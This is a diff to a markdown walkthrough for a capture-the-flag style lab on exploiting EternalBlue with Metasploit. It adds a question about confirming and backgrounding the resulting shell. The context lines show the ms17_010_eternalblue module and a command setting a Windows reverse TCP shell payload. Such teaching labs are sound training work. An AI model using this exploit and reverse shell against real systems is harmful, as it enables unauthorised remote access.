@@ -458,6 +458,16 @@ msf exploit(windows/smb/ms17_010_eternalblue) >
 
 ### Q7 Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:<br>`set payload windows/x64/shell/reverse_tcp`<br>With that done, run the exploit!
 
+==No answer needed==
+<div align="center">
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+</div>
+
+### Q8 Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.
+
 ==Answer==
 <div align="center">
 <br>
